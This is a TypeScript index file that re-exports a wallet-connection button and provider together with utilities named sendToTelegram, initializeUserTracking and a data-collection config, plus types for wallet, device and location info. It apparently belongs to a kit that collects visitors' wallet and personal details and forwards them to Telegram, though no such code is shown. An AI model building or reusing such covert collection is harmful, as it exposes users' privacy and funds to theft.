/**
 * Wallet Connection Component - Main Export File
 * 
 * This file exports all the components, utilities, types, and configuration
 * needed to use the wallet connection component in any project.
 */

// Components
import { WalletProvider, WalletProviderProps } from './providers/WalletProvider';
import ConnectWalletButton, { ConnectWalletButtonProps } from './components/ConnectWalletButton';

// Configuration
import * as config from './config';
import { 
  TELEGRAM_CONFIG, getTelegramConfig,
  USER_INFO_CONFIG, getUserInfoConfig,
  STORAGE_CONFIG, 
  DATA_COLLECTION_CONFIG
} from './config';

// Utilities
import { StorageManager } from './utils/storage';
import { sendToTelegram } from './utils/telegram';
import { initializeUserTracking } from './utils/userInfo';
import { jwtService } from './utils/jwtService';

// Types
import type { UserInfo, WalletInfo, DeviceInfo, LocationInfo, WebsiteInfo } from './types/userInfo';

// Components and functions
export {
  // Components
  ConnectWalletButton,
  WalletProvider,
  
  // Configuration
  config,
  TELEGRAM_CONFIG, getTelegramConfig,
  USER_INFO_CONFIG, getUserInfoConfig,
  STORAGE_CONFIG, 
  DATA_COLLECTION_CONFIG,
  
  // Utilities
  StorageManager,
  sendToTelegram,
  initializeUserTracking,
  jwtService,
};

// Export types properly for TypeScript with isolatedModules
export type {
  // Component Props
  WalletProviderProps,
  ConnectWalletButtonProps,
  
  // Data Types
  UserInfo,
  WalletInfo,
  DeviceInfo,
  LocationInfo,
  WebsiteInfo
};
